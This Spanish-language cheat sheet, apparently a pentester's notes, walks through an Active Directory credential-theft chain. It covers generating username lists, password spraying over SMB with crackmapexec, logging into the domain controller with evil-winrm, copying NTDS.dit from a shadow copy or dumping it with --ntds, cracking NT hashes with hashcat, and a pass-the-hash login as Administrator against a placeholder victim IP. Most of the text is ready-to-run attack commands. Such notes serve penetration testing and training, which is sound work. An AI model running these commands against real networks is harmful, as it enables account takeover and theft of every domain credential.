# Atacar Active Directory y NTDS.dit
## Descripción
Extraer credenciales mendiante el uso de ataque de diccionario contra cuenta de AD y dumpear hashes desde el NTDS.dit.

### Forma típica de usuarios en el Dominio
- **firstinitiallastname:** jdoe
- **firstinitialmiddleinitiallastname:** jjdoe
- **firstnamelastname:** janedoe
- **firstname.lastname:** jane.doe
- **lastname.firstname:** doe.jane
- **nickname:** doedoehacksstuff

Podemos crear un diccionario de usernames para temas de dominio con el siguiente repo de github: https://github.com/urbanadventurer/username-anarchy

```python
./username-anarchy -i /home/kali/names.txt (los nombres que has creado ejem : Giafar Maldonado)
```
Lanzar un ataque con la lista de posibles usuario combinado con una lista de contraseñas

```python
crackmapexec smb IPVICTIMA -u gmaldonado -p /usr/share/wordlists/fasttrack.txt
```
### Conexión a DC
```python
evil-winrm -i IPVICTIMA  -u gmaldonado -p 'password'
net localgroup
net user gmaldonado
```
### Crear una instancia de C:
```python
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS.dit
```
Toca transferir ese archivo a tu equipo
### Una forma más rápida de capturar NTDS.dit
```python
crackmapexec smb IPVICTIMA -u gmaldonado -p password --ntds
```
Luego puedes romper los hashes NT con el siguiente comando
```python
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
### Ejemplo de pass-the-hash PTH
```python
evil-winrm -i IPVICTIMA -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
